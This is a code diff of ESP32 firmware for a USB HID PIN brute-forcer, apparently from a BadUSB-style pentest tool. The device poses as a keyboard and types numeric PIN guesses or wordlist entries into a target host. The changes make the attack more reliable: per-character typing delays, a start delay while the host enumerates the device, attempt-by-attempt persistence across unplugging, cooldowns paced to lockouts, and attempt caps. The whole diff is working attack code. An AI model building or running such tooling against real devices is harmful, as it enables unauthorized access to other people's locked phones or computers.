@@ -82,9 +82,7 @@ const char* PinBruteforce::stateName() const {
 }
 
 const char* PinBruteforce::modeName() const {
-    return _mode == PinBruteforceMode::STANDALONE_NATIVE_HID
-        ? "standalone_native_hid"
-        : "external_ch9329_realtime";
+    return "standalone_native_hid";
 }
 
 const char* PinBruteforce::sourceName() const {
@@ -112,16 +110,7 @@ bool PinBruteforce::parseConfig(JsonObject args, String& error) {
     _pinLength = (uint8_t)(args["pin_length"] | 4);
     _start = String((const char*)(args["start"] | ""));
     _end = String((const char*)(args["end"] | ""));
-    const char* charsetArg = args["charset"] | "digits";
-    if (strcmp(charsetArg, "digits") == 0) {
-        _charset = "0123456789";
-    } else if (strcmp(charsetArg, "custom") == 0) {
-        _charset = String((const char*)(args["custom_chars"] | "0123456789"));
-    } else {
-        _charset = String(charsetArg);
-    }
-    _prefix = String((const char*)(args["prefix"] | ""));
-    _suffix = String((const char*)(args["suffix"] | ""));
+    _charset = "0123456789";
     _timeoutMs = (uint32_t)(args["timeout_ms"] | 1000);
     _attemptsBeforeTimeout = (uint16_t)(
         args["attempts_before_cooldown"] |
@@ -129,12 +118,13 @@ bool PinBruteforce::parseConfig(JsonObject args, String& error) {
         0);
     _cooldownMs = (uint32_t)(args["cooldown_ms"] | 30000);
     _interAttemptMs = (uint32_t)(args["inter_attempt_ms"] | 400);
+    _typingDelayMs = (uint16_t)(args["typing_delay_ms"] | 20);
+    _startDelayMs = (uint16_t)(args["start_delay_ms"] | 1500);
     _autoResume = args["auto_resume"] | true;
     _sessionKey = String((const char*)(args["session_key"] | "default"));
     _wordlistFile = String((const char*)(args["wordlist_file"] | PIN_WORDLIST_PATH));
-    _uartBaud = (uint32_t)(args["uart_baud"] | 115200);
-    _uartRxPin = (int8_t)(args["uart_rx"] | -1);
-    _uartTxPin = (int8_t)(args["uart_tx"] | -1);
+    _maxAttempts = (uint32_t)(args["max_attempts"] | 0);
+    _persistEvery = (uint16_t)(args["persist_every"] | 1);
 
     if (_wordlistFile.length() == 0) _wordlistFile = PIN_WORDLIST_PATH;
     if (_charset.length() < 2) {
@@ -149,8 +139,13 @@ bool PinBruteforce::parseConfig(JsonObject args, String& error) {
     if (_timeoutMs < 50) _timeoutMs = 50;
     if (_timeoutMs > 60000) _timeoutMs = 60000;
     if (_interAttemptMs > 60000) _interAttemptMs = 60000;
+    if (_typingDelayMs > 500) _typingDelayMs = 500;
+    if (_startDelayMs > 10000) _startDelayMs = 10000;
     if (_attemptsBeforeTimeout > 1000) _attemptsBeforeTimeout = 1000;
     if (_cooldownMs > 600000) _cooldownMs = 600000;
+    if (_maxAttempts > 1000000000UL) _maxAttempts = 1000000000UL;
+    if (_persistEvery < 1) _persistEvery = 1;
+    if (_persistEvery > 1000) _persistEvery = 1000;
     return true;
 }
 
@@ -165,6 +160,22 @@ bool PinBruteforce::validateConfig(String& error) {
         _currentIndex = 0;
         _endIndex = 0;
         return true;
+    }
+
+    // Custom charsets with duplicates make index conversion ambiguous.
+    for (size_t i = 0; i < _charset.length(); i++) {
+        for (size_t j = i + 1; j < _charset.length(); j++) {
+            if (_charset[i] == _charset[j]) {
+                error = "charset contains duplicate characters";
+                return false;
+            }
+        }
+    }
+
+    const uint64_t combinations = saturatingPow(_charset.length(), _pinLength);
+    if (combinations == UINT64_MAX || combinations > 0xFFFFFFFFUL) {
+        error = "range is too large for this firmware";
+        return false;
     }
 
     if (_start.length() == 0) {
@@ -187,26 +198,45 @@ bool PinBruteforce::validateConfig(String& error) {
         return false;
     }
 
+    auto toIndex = [&](const String& value, uint64_t& out) -> bool {
+        uint64_t result = 0;
+        const uint64_t base = _charset.length();
+        for (size_t i = 0; i < value.length(); i++) {
+            const int idx = charIndex(_charset, value[i]);
+            if (idx < 0) {
+                error = "range value contains a character outside charset";
+                return false;
+            }
+            if (result > (UINT64_MAX - (uint64_t)idx) / base) {
+                error = "range value overflows 64-bit index";
+                return false;
+            }
+            result = (result * base) + (uint64_t)idx;
+        }
+        out = result;
+        return true;
+    };
+
     uint64_t startIndex = 0;
     uint64_t endIndex = 0;
-    for (size_t i = 0; i < _start.length(); i++) {
-        int idx = charIndex(_charset, _start[i]);
-        if (idx < 0) { error = "start contains a character outside charset"; return false; }
-        startIndex = (startIndex * _charset.length()) + idx;
-    }
-    for (size_t i = 0; i < _end.length(); i++) {
-        int idx = charIndex(_charset, _end[i]);
-        if (idx < 0) { error = "end contains a character outside charset"; return false; }
-        endIndex = (endIndex * _charset.length()) + idx;
-    }
+    if (!toIndex(_start, startIndex)) return false;
+    if (!toIndex(_end, endIndex)) return false;
 
     if (endIndex < startIndex) {
         error = "end is before start";
         return false;
     }
+
+    const uint64_t rangeCount = (endIndex - startIndex) + 1ULL;
+    if (rangeCount > 0xFFFFFFFFUL) {
+        error = "range exceeds supported attempt count";
+        return false;
+    }
+
     _startIndex = startIndex;
     _currentIndex = startIndex;
     _endIndex = endIndex;
+    _estimatedTotal = rangeCount;
     return true;
 }
 
@@ -214,6 +244,16 @@ bool PinBruteforce::loadWordlist(String& error) {
     error = "";
     _wordlist = "";
     if (!buildWordlistLines(error)) return false;
+    uint32_t lines = 0;
+    int start = 0;
+    while (start <= (int)_wordlist.length()) {
+        int nl = _wordlist.indexOf('\n', start);
+        String line = (nl < 0) ? _wordlist.substring(start) : _wordlist.substring(start, nl);
+        if (line.length() > 0) lines++;
+        if (nl < 0) break;
+        start = nl + 1;
+    }
+    _estimatedTotal = lines;
     return true;
 }
 
@@ -284,17 +324,23 @@ bool PinBruteforce::nextPin(String& out) {
         if (!readLineFromWordlist((uint32_t)_currentIndex, out)) return false;
         _currentIndex++;
     } else {
-        if (_currentIndex > _endIndex) return false;
-        if (!nextRangePin(out)) return false;
-        _currentIndex++;
+        // Drive range generation from attempts_total instead of a separately
+        // restored cursor. This keeps the sequence strictly contiguous across
+        // unplug/re-arm cycles and prevents skipped PIN values.
+        const uint64_t candidate = _startIndex + (uint64_t)_attemptsTotal;
+        if (candidate > _endIndex) return false;
+        if (!nextRangePinAt(candidate, out)) return false;
+        _currentIndex = candidate + 1ULL;
     }
-    out = _prefix + out + _suffix;
     return true;
 }
 
 bool PinBruteforce::nextRangePin(String& out) {
+    return nextRangePinAt(_currentIndex, out);
+}
+
+bool PinBruteforce::nextRangePinAt(uint64_t value, String& out) {
     char buffer[13] = {0};
-    uint64_t value = _currentIndex;
     const uint32_t base = _charset.length();
     for (int i = _pinLength - 1; i >= 0; i--) {
         buffer[i] = _charset[value % base];
@@ -305,127 +351,35 @@ bool PinBruteforce::nextRangePin(String& out) {
 }
 
 bool PinBruteforce::initHid(String& error) {
-    if (_mode == PinBruteforceMode::STANDALONE_NATIVE_HID) {
 #if defined(CONFIG_IDF_TARGET_ESP32S2) || defined(CONFIG_IDF_TARGET_ESP32S3)
-        if (!UsbHID::available()) {
-            error = "native HID unavailable";
-            return false;
-        }
-        _hidReady = true;
-        return true;
-#else
-        error = "standalone_native_hid requires ESP32-S2/S3";
+    if (!UsbHID::available()) {
+        error = "native HID unavailable";
         return false;
-#endif
     }
-
-    if (!initCh9329(error)) return false;
     _hidReady = true;
     return true;
+#else
+    error = "standalone_native_hid requires ESP32-S2/S3";
+    return false;
+#endif
 }
 
 void PinBruteforce::stopHid() {
     if (!_hidReady) return;
-    if (_mode == PinBruteforceMode::STANDALONE_NATIVE_HID) {
 #if defined(CONFIG_IDF_TARGET_ESP32S2) || defined(CONFIG_IDF_TARGET_ESP32S3)
-        UsbHID::releaseAll();
+    UsbHID::releaseAll();
 #endif
-    } else {
-        ch9329ReleaseAll();
-    }
     _hidReady = false;
 }
 
-bool PinBruteforce::initCh9329(String& error) {
-    Serial1.begin(_uartBaud, SERIAL_8N1, _uartRxPin, _uartTxPin);
-    delay(50);
-    ch9329ReleaseAll();
-    return true;
-}
-
-void PinBruteforce::ch9329SendKey(uint8_t keycode, uint8_t modifiers) {
-    uint8_t frame[14] = {0x57, 0xAB, 0x00, 0x02, 0x08,
-                         modifiers, 0x00, keycode, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-    uint8_t sum = 0;
-    for (int i = 0; i < 13; i++) sum = (uint8_t)(sum + frame[i]);
-    frame[13] = sum;
-    Serial1.write(frame, sizeof(frame));
-    Serial1.flush();
-}
-
-bool PinBruteforce::ch9329Char(char c) {
-    uint8_t modifier = 0;
-    uint8_t keycode = 0;
-
-    if (c >= 'a' && c <= 'z') keycode = 0x04 + (c - 'a');
-    else if (c >= 'A' && c <= 'Z') { keycode = 0x04 + (c - 'A'); modifier = 0x02; }
-    else if (c >= '1' && c <= '9') keycode = 0x1E + (c - '1');
-    else if (c == '0') keycode = 0x27;
-    else if (c == ' ') keycode = 0x2C;
-    else if (c == '-') keycode = 0x2D;
-    else if (c == '_') { keycode = 0x2D; modifier = 0x02; }
-    else if (c == '=') keycode = 0x2E;
-    else if (c == '+') { keycode = 0x2E; modifier = 0x02; }
-    else if (c == '[') keycode = 0x2F;
-    else if (c == '{') { keycode = 0x2F; modifier = 0x02; }
-    else if (c == ']') keycode = 0x30;
-    else if (c == '}') { keycode = 0x30; modifier = 0x02; }
-    else if (c == '\\') keycode = 0x31;
-    else if (c == '|') { keycode = 0x31; modifier = 0x02; }
-    else if (c == ';') keycode = 0x33;
-    else if (c == ':') { keycode = 0x33; modifier = 0x02; }
-    else if (c == '\'') keycode = 0x34;
-    else if (c == '"') { keycode = 0x34; modifier = 0x02; }
-    else if (c == '`') keycode = 0x35;
-    else if (c == '~') { keycode = 0x35; modifier = 0x02; }
-    else if (c == ',') keycode = 0x36;
-    else if (c == '<') { keycode = 0x36; modifier = 0x02; }
-    else if (c == '.') keycode = 0x37;
-    else if (c == '>') { keycode = 0x37; modifier = 0x02; }
-    else if (c == '/') keycode = 0x38;
-    else if (c == '?') { keycode = 0x38; modifier = 0x02; }
-    else if (c == '!') { keycode = 0x1E; modifier = 0x02; }
-    else if (c == '@') { keycode = 0x1F; modifier = 0x02; }
-    else if (c == '#') { keycode = 0x20; modifier = 0x02; }
-    else if (c == '$') { keycode = 0x21; modifier = 0x02; }
-    else if (c == '%') { keycode = 0x22; modifier = 0x02; }
-    else if (c == '^') { keycode = 0x23; modifier = 0x02; }
-    else if (c == '&') { keycode = 0x24; modifier = 0x02; }
-    else if (c == '*') { keycode = 0x25; modifier = 0x02; }
-    else if (c == '(') { keycode = 0x26; modifier = 0x02; }
-    else if (c == ')') { keycode = 0x27; modifier = 0x02; }
-    else return false;
-
-    ch9329SendKey(keycode, modifier);
-    delay(6);
-    ch9329SendKey(0, 0);
-    delay(6);
-    return true;
-}
-
-void PinBruteforce::ch9329ReleaseAll() {
-    ch9329SendKey(0, 0);
-}
-
 void PinBruteforce::sendCurrentPin() {
-    if (_mode == PinBruteforceMode::STANDALONE_NATIVE_HID) {
 #if defined(CONFIG_IDF_TARGET_ESP32S2) || defined(CONFIG_IDF_TARGET_ESP32S3)
-        UsbHID::sendText(_lastPin);
-        UsbHID::pressEnter();
+    // Type each character with a small gap. This avoids target hosts that
+    // lose a digit or an entire line when USB HID reports arrive too fast.
+    UsbHID::sendTextSlow(_lastPin, _typingDelayMs);
+    delay(50);
+    UsbHID::pressEnter();
 #endif
-        return;
-    }
-
-    for (size_t i = 0; i < _lastPin.length(); i++) {
-        if (!ch9329Char(_lastPin[i])) {
-            _lastError = "unsupported wordlist character";
-            emitError("hid_encode", _lastError.c_str());
-            break;
-        }
-    }
-    ch9329SendKey(0x28, 0);
-    delay(6);
-    ch9329SendKey(0, 0);
 }
 
 bool PinBruteforce::start(JsonObject args, String& error) {
@@ -438,6 +392,11 @@ bool PinBruteforce::start(JsonObject args, String& error) {
     const uint32_t savedAttemptsInCycle = _attemptsInCycle;
     const String savedLastPin = _lastPin;
     const uint32_t savedStartedAt = _startedAt;
+    const uint64_t savedEstimatedTotal = _estimatedTotal;
+    const uint8_t savedPinLength = _pinLength;
+    const String savedStart = _start;
+    const String savedEnd = _end;
+    const String savedCharset = _charset;
 
     stop();
     resetWordlistUpload();
@@ -454,6 +413,11 @@ bool PinBruteforce::start(JsonObject args, String& error) {
         _attemptsInCycle = savedAttemptsInCycle;
         _lastPin = savedLastPin;
         _startedAt = savedStartedAt ? savedStartedAt : millis();
+        _estimatedTotal = savedEstimatedTotal;
+        _pinLength = savedPinLength;
+        _start = savedStart;
+        _end = savedEnd;
+        _charset = savedCharset;
     } else {
         _attemptsTotal = 0;
         _attemptsInCycle = 0;
@@ -463,6 +427,7 @@ bool PinBruteforce::start(JsonObject args, String& error) {
     _lastError = "";
     _updatedAt = millis();
     _nextAttemptAtMs = 0;
+    _stopReason = "";
 
     if (_standalone) {
 #if !defined(CONFIG_IDF_TARGET_ESP32S2) && !defined(CONFIG_IDF_TARGET_ESP32S3)
@@ -491,43 +456,6 @@ bool PinBruteforce::start(JsonObject args, String& error) {
     return true;
 }
 
-bool PinBruteforce::resume(String& error) {
-    Preferences prefs;
-    if (!prefs.begin(NVS_NAMESPACE, true)) {
-        error = "NVS unavailable";
-        return false;
-    }
-    bool hasSession = prefs.isKey("state");
-    prefs.end();
-    if (!hasSession) {
-        error = "no persisted session";
-        return false;
-    }
-
-    loadPersistedSession();
-    if (_state == PinBruteforceState::IDLE || _state == PinBruteforceState::DONE) {
-        error = "persisted session is already finished";
-        return false;
-    }
-    if (_mode == PinBruteforceMode::STANDALONE_NATIVE_HID) {
-        error = "native HID is one-shot; re-arm with PIN_RANGE_START and reconnect";
-        return false;
-    }
-    if (_source == PinBruteforceSource::WORDLIST && !loadWordlist(error)) {
-        return false;
-    }
-    if (!initHid(error)) {
-        _state = PinBruteforceState::ERROR_STATE;
-        emitError("hid_init", error.c_str());
-        return false;
-    }
-    _standalone = false;
-    _state = PinBruteforceState::RUNNING;
-    _nextAttemptAtMs = millis();
-    emitStatus("resumed");
-    return true;
-}
-
 void PinBruteforce::disarm() {
     // Lightweight mutual-exclusion helper for the BadUSB path. Do not touch
     // HID state or emit events; only clear the boot-armed flag.
@@ -543,6 +471,7 @@ bool PinBruteforce::stop() {
     if (_state == PinBruteforceState::RUNNING || _state == PinBruteforceState::ARMED) {
         _state = PinBruteforceState::PAUSED;
         _armed = false;
+        _stopReason = "stopped";
         _updatedAt = millis();
         stopHid();
         persistSession();
@@ -570,6 +499,8 @@ bool PinBruteforce::clear(bool clearWordlist, String& error) {
     _lastError = "";
     _startedAt = 0;
     _updatedAt = 0;
+    _estimatedTotal = 0;
+    _stopReason = "";
     _wordlist = "";
     clearPersistedSession();
     if (clearWordlist) removeWordlistFile();
@@ -586,9 +517,20 @@ void PinBruteforce::update() {
     const uint32_t now = millis();
     if (_nextAttemptAtMs != 0 && now < _nextAttemptAtMs) return;
 
+    if (_maxAttempts > 0 && _attemptsTotal >= _maxAttempts) {
+        _state = PinBruteforceState::DONE;
+        _stopReason = "max_attempts";
+        _updatedAt = now;
+        stopHid();
+        persistSession();
+        emitDone();
+        return;
+    }
+
     String pin;
     if (!nextPin(pin)) {
         _state = PinBruteforceState::DONE;
+        _stopReason = "exhausted";
         _updatedAt = now;
         stopHid();
         persistSession();
@@ -608,9 +550,12 @@ void PinBruteforce::update() {
         _attemptsInCycle = 0;
         cooldown = true;
     }
+    persistProgress();
+    if (_persistEvery == 1 || (_attemptsTotal % _persistEvery) == 0 || cooldown) {
+        persistSession();
+    }
     _nextAttemptAtMs = now + _timeoutMs + (cooldown ? _cooldownMs : 0) + _interAttemptMs;
 
-    if ((_attemptsTotal % PERSIST_EVERY_N) == 0 || cooldown) persistSession();
     if (_state == PinBruteforceState::ERROR_STATE) {
         stopHid();
     }
@@ -656,10 +601,28 @@ bool PinBruteforce::runIfArmed() {
     if (_startedAt == 0) _startedAt = millis();
     emitStatus("standalone_running");
 
+    // Give the target host time to enumerate the HID interface and focus its
+    // PIN field before the first report. Some hosts drop the first HID report
+    // after a cold boot/replug, which makes the persisted attempt count appear
+    // one ahead and causes a perceived skipped PIN on the next re-arm.
+    UsbHID::releaseAll();
+    if (_startDelayMs > 0) delay(_startDelayMs);
+
     while (_state == PinBruteforceState::RUNNING) {
+        if (_maxAttempts > 0 && _attemptsTotal >= _maxAttempts) {
+            _state = PinBruteforceState::DONE;
+            _stopReason = "max_attempts";
+            _armed = false;
+            _updatedAt = millis();
+            persistSession();
+            emitDone();
+            break;
+        }
+
         String pin;
         if (!nextPin(pin)) {
             _state = PinBruteforceState::DONE;
+            _stopReason = "exhausted";
             _armed = false;
             _updatedAt = millis();
             persistSession();
@@ -678,10 +641,16 @@ bool PinBruteforce::runIfArmed() {
             _attemptsInCycle = 0;
             cooldown = true;
         }
+        // Persist lightweight progress immediately after every completed
+        // attempt, regardless of the full-session persistence interval, so a
+        // sudden unplug still reports the correct last PIN and count.
+        persistProgress();
+        if (_persistEvery == 1 || (_attemptsTotal % _persistEvery) == 0 || cooldown) {
+            persistSession();
+        }
         delay(_timeoutMs);
         if (cooldown) delay(_cooldownMs);
         if (_interAttemptMs > 0) delay(_interAttemptMs);
-        if ((_attemptsTotal % PERSIST_EVERY_N) == 0 || cooldown) persistSession();
     }
 
     stopHid();
@@ -713,6 +682,8 @@ void PinBruteforce::emitAttempt() {
     doc["current_sequence"] = _currentIndex;
     doc["attempts_total"] = _attemptsTotal;
     doc["attempts_in_cycle"] = _attemptsInCycle;
+    doc["estimated_total"] = _estimatedTotal;
+    doc["max_attempts"] = _maxAttempts;
     doc["started_at"] = _startedAt;
     doc["updated_at"] = _updatedAt;
     _proto->sendEvent("pin_attempt", doc);
@@ -725,6 +696,7 @@ void PinBruteforce::emitDone() {
     doc["source"] = sourceName();
     doc["attempts_total"] = _attemptsTotal;
     doc["last_pin"] = _lastPin;
+    doc["stop_reason"] = _stopReason.length() ? _stopReason : "unknown";
     doc["started_at"] = _startedAt;
     doc["updated_at"] = _updatedAt;
     _proto->sendEvent("pin_range_done", doc);
@@ -751,16 +723,25 @@ void PinBruteforce::status(JsonDocument& doc) {
     doc["start"] = _start;
     doc["end"] = _end;
     doc["charset"] = _charset;
-    doc["charset_mode"] = (_charset == "0123456789") ? "digits" : "custom";
-    doc["prefix"] = _prefix;
-    doc["suffix"] = _suffix;
     doc["timeout_ms"] = _timeoutMs;
     doc["attempts_before_cooldown"] = _attemptsBeforeTimeout;
     doc["attempts_before_timeout"] = _attemptsBeforeTimeout;
     doc["cooldown_ms"] = _cooldownMs;
     doc["inter_attempt_ms"] = _interAttemptMs;
+    doc["typing_delay_ms"] = _typingDelayMs;
+    doc["start_delay_ms"] = _startDelayMs;
     doc["auto_resume"] = _autoResume;
     doc["session_key"] = _sessionKey;
+    doc["max_attempts"] = _maxAttempts;
+    doc["persist_every"] = _persistEvery;
+    doc["estimated_total"] = _estimatedTotal;
+    uint64_t effectiveTotal = _estimatedTotal;
+    if (_maxAttempts > 0 && _maxAttempts < effectiveTotal) effectiveTotal = _maxAttempts;
+    const uint32_t progress = (effectiveTotal == 0)
+        ? 0
+        : (uint32_t)((uint64_t)_attemptsTotal * 100ULL / effectiveTotal);
+    doc["progress_percent"] = progress > 100 ? 100 : progress;
+    doc["stop_reason"] = _stopReason;
     doc["start_index"] = (uint32_t)_startIndex;
     doc["current_index"] = (uint32_t)_currentIndex;
     doc["end_index"] = (uint32_t)_endIndex;
@@ -814,26 +795,43 @@ void PinBruteforce::persistSession() {
     prefs.putUChar("pin_len", _pinLength);
     prefs.putString("start", _start);
     prefs.putString("end", _end);
-    prefs.putString("charset", _charset);
-    prefs.putString("prefix", _prefix);
-    prefs.putString("suffix", _suffix);
     prefs.putUInt("timeout", _timeoutMs);
     prefs.putUShort("att_before", _attemptsBeforeTimeout);
     prefs.putUInt("cooldown", _cooldownMs);
     prefs.putUInt("inter", _interAttemptMs);
+    prefs.putUShort("typing_delay", _typingDelayMs);
+    prefs.putUShort("start_delay", _startDelayMs);
     prefs.putBool("auto_resume", _autoResume);
     prefs.putString("wordlist_file", _wordlistFile);
+    prefs.putUInt("max_attempts", _maxAttempts);
+    prefs.putUShort("persist_every", _persistEvery);
     prefs.putULong64("start_index", _startIndex);
     prefs.putULong64("current_index", _currentIndex);
     prefs.putULong64("end_index", _endIndex);
     prefs.putUInt("attempts_total", _attemptsTotal);
     prefs.putUInt("attempts_cycle", _attemptsInCycle);
+    prefs.putULong64("estimated_total", _estimatedTotal);
+    prefs.putString("stop_reason", _stopReason);
     prefs.putString("last_pin", _lastPin);
     prefs.putString("last_error", _lastError);
     prefs.putUInt("started_at", _startedAt);
     prefs.putUInt("updated_at", _updatedAt);
     prefs.end();
     _nvsDirty = false;
+}
+
+void PinBruteforce::persistProgress() {
+    Preferences prefs;
+    if (!prefs.begin(NVS_NAMESPACE, false)) return;
+    prefs.putBool("armed", _armed);
+    prefs.putUChar("state", (uint8_t)_state);
+    prefs.putULong64("current_index", _currentIndex);
+    prefs.putUInt("attempts_total", _attemptsTotal);
+    prefs.putUInt("attempts_cycle", _attemptsInCycle);
+    prefs.putString("last_pin", _lastPin);
+    prefs.putString("stop_reason", _stopReason);
+    prefs.putUInt("updated_at", _updatedAt);
+    prefs.end();
 }
 
 void PinBruteforce::loadPersistedSession() {
@@ -849,22 +847,25 @@ void PinBruteforce::loadPersistedSession() {
     _pinLength = prefs.getUChar("pin_len", 4);
     _start = prefs.getString("start", "");
     _end = prefs.getString("end", "");
-    _charset = prefs.getString("charset", "0123456789");
-    _prefix = prefs.getString("prefix", "");
-    _suffix = prefs.getString("suffix", "");
     _timeoutMs = prefs.getUInt("timeout", 1000);
     _attemptsBeforeTimeout = prefs.getUShort("att_before", 0);
     _cooldownMs = prefs.getUInt("cooldown", 30000);
     _interAttemptMs = prefs.getUInt("inter", 400);
+    _typingDelayMs = prefs.getUShort("typing_delay", 20);
+    _startDelayMs = prefs.getUShort("start_delay", 1500);
     _autoResume = prefs.getBool("auto_resume", true);
     _sessionKey = prefs.getString("session_key", "default");
     _armed = prefs.getBool("armed", false);
     _wordlistFile = prefs.getString("wordlist_file", PIN_WORDLIST_PATH);
+    _maxAttempts = prefs.getUInt("max_attempts", 0);
+    _persistEvery = prefs.getUShort("persist_every", 1);
     _startIndex = prefs.getULong64("start_index", 0);
     _currentIndex = prefs.getULong64("current_index", _startIndex);
     _endIndex = prefs.getULong64("end_index", 0);
     _attemptsTotal = prefs.getUInt("attempts_total", 0);
     _attemptsInCycle = prefs.getUInt("attempts_cycle", 0);
+    _estimatedTotal = prefs.getULong64("estimated_total", 0);
+    _stopReason = prefs.getString("stop_reason", "");
     _lastPin = prefs.getString("last_pin", "");
     _lastError = prefs.getString("last_error", "");
     _startedAt = prefs.getUInt("started_at", 0);
@@ -888,9 +889,20 @@ bool PinBruteforce::beginWordlistUpload(String& error) {
     return true;
 }
 
-bool PinBruteforce::addWordlistChunk(const uint8_t* data, size_t len, bool last, String& error) {
+bool PinBruteforce::addWordlistChunk(
+    const uint8_t* data,
+    size_t len,
+    uint32_t offset,
+    uint32_t checksum,
+    bool last,
+    String& error
+) {
     if (!_uploadActive) {
         error = "wordlist upload not started";
+        return false;
+    }
+    if (offset != _uploadBuffer.length()) {
+        error = "wordlist chunk offset mismatch";
         return false;
     }
     if (data && len > 0) {
@@ -898,7 +910,16 @@ bool PinBruteforce::addWordlistChunk(const uint8_t* data, size_t len, bool last,
             error = "wordlist exceeds 16 KB";
             return false;
         }
+        uint32_t actualChecksum = 0;
+        for (size_t i = 0; i < len; i++) actualChecksum += data[i];
+        if (actualChecksum != checksum) {
+            error = "wordlist chunk checksum mismatch";
+            return false;
+        }
         _uploadBuffer.concat((const char*)data, len);
+    } else if (checksum != 0) {
+        error = "wordlist chunk checksum mismatch";
+        return false;
     }
     if (!last) return true;
 
@@ -956,7 +977,8 @@ bool PinBruteforce::readWordlistFile(String& out) {
 }
 
 bool PinBruteforce::writeWordlistFile(const String& content) {
-    if (!pinFsBegin(true)) return false;
+    // Never format the shared FAT/FFat volume just to write a wordlist.
+    if (!pinFsBegin(false)) return false;
     File file = PIN_FS_OPEN(_wordlistFile.c_str(), FILE_WRITE);
     if (!file) {
         pinFsEnd();
